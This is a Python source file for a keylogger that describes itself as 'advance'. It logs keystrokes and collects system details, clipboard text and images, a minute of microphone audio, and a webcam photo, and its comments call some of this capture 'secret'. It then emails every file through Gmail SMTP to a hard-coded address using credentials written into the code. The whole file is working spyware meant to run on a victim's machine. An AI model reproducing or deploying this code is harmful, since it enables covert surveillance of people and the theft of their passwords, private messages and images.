# Features of this Advance key logger
# 1. Record key strokes
# 2. secretly grabs images from clipboard
# 3. grabs text from clipboard
# 4. record audio
# 5. secretly captures tha pic of user from camera
# 6. send all the recorded files to email 

# ----------------importing modules----------------
from numpy import False_
from numpy.lib.function_base import append, meshgrid
from pynput.keyboard import Key, Listener

import time
import os

import tkinter as tk

import socket
import platform

import cv2
import html
import uuid

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.image import MIMEImage
from email.mime.audio import MIMEAudio
from email.header import Header
from email import encoders
import smtplib


from scipy.io.wavfile import write
import sounddevice as sd

from multiprocessing import process, freeze_support
from PIL import ImageGrab


# ----------------Recording Keystrokes----------------
Keys = []

def onPress(key):
    global Keys, currTime
    Keys.append(key)
    writeInFile(Keys)
    Keys = []
    currTime = time.time()


def writeInFile(Keys):
    with open("file.txt", "a") as file:
        for i in Keys:
            k = str(i).replace("'", "")
            file.write(time.ctime() +
                    "  " +
                    k + "\n")
    file.close()

def onRelease(key):
    if key == Key.esc:
        return False

with Listener(on_press=onPress, on_release=onRelease) as listener:
    listener.join()


# ----------------Gathering System information----------------
def sysInfo():
    with open("sysInfo.txt", "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        f.write(f"Host name : {hostname}")
        f.write(f"\nIp Address : {IPAddr}")
        f.write(f"\nSystem: {platform.system()}")
        f.write(f"\nRelease: {platform.release()}")
        f.write(f"\nVersion: {platform.version()}")
        f.write(f"\nMachine: {platform.machine()}")
        f.write(f"\nProcessor: {platform.processor()}")
    f.close()
sysInfo()

# ----------------clipboard information----------------
def clipInfo():
    with open("clipboard.txt", "a") as f:
        try:
            root = tk.Tk()
            root.withdraw()
            s = root.clipboard_get()
            s=s.replace("clipInfo()","")
            f.write(s+"\n")
        except:
            f.write("Clipboard is empty\n")
clipInfo()

# ----------------Taking screenshots----------------
def takeSs():
    try:
        img = ImageGrab.grabclipboard()
        img.save('pic.png', 'PNG')
    except:
        pass
takeSs()

# ----------------Recording sound----------------
def recSound():
    freq = 44100
    duration = 60
    recording = sd.rec(int(duration * freq), samplerate=freq, channels=2)
    sd.wait()
    write("audio.mp3", freq, recording)
recSound()

# ----------------Capture user image----------------
def capImag():
    videoCaptureObject = cv2.VideoCapture(0)
    result = True
    while(result):
        ret,frame = videoCaptureObject.read()
        cv2.imwrite("UserPic.jpg",frame)
        result = False
    videoCaptureObject.release()
    cv2.destroyAllWindows()
capImag()

# ----------------Sending emails----------------
def sendingEmail():
    senderAddr = "rishijabc@gmail.com"
    senderPass = "123@Abcd"
    receiverAddr = "rishijha238@gmail.com"

    msg = MIMEMultipart()
    msg['From'] = senderAddr
    msg['To'] = receiverAddr
    msg['Subject'] = "Test mail 3"
    body = "The text file attached here is the data of all the key strokes"
    msg.attach(MIMEText(body, 'plain'))

    filename1 = "file.txt"
    attachment1 = open(filename1, "rb")
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment1).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename1)
    msg.attach(p)

    filename2 = "sysInfo.txt"
    attachment2 = open(filename2, "rb")
    q = MIMEBase('application', 'octet-stream')
    q.set_payload((attachment2).read())
    encoders.encode_base64(q)
    q.add_header('Content-Disposition', "attachment; filename= %s" % filename2)
    msg.attach(q)

    filename3 = "clipboard.txt"
    attachment3 = open(filename3, "rb")
    r = MIMEBase('application', 'octet-stream')
    r.set_payload((attachment3).read())
    encoders.encode_base64(r)
    r.add_header('Content-Disposition', "attachment; filename= %s" % filename3)
    msg.attach(r)

    msg_alternative = MIMEMultipart('alternative')
    img = dict(title=u'Picture report…', path=u'pic.png', cid=str(uuid.uuid4()))
    msg_text = MIMEText(u'[image: {title}]'.format(**img), 'plain', 'utf-8')
    msg_alternative.attach(msg_text)
    msg_html = MIMEText(u'<div dir="ltr">'
                     '<img src="cid:{cid}" alt="{alt}"><br></div>'
                    .format(alt=html.escape(img['title'], quote=True), **img),
                    'html', 'utf-8')
    msg_alternative.attach(msg_html)
    with open(img['path'], 'rb') as file:
        msg_image = MIMEImage(file.read(), name=os.path.basename(img['path']))
        msg.attach(msg_image)
    msg_image.add_header('Content-ID', '<{}>'.format(img['cid']))

    img = dict(title=u'Picture report…', path=u'UserPic.jpg', cid=str(uuid.uuid4()))
    msg_text = MIMEText(u'[image: {title}]'.format(**img), 'plain', 'utf-8')
    msg_alternative.attach(msg_text)
    msg_html = MIMEText(u'<div dir="ltr">'
                     '<img src="cid:{cid}" alt="{alt}"><br></div>'
                    .format(alt=html.escape(img['title'], quote=True), **img),
                    'html', 'utf-8')
    msg_alternative.attach(msg_html)
    with open(img['path'], 'rb') as file:
        msg_image = MIMEImage(file.read(), name=os.path.basename(img['path']))
        msg.attach(msg_image)
    msg_image.add_header('Content-ID', '<{}>'.format(img['cid']))

    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(senderAddr, senderPass)
    text = msg.as_string()
    s.sendmail(senderAddr, receiverAddr, text)
    print("Email sent\n")
    s.quit()
sendingEmail()







        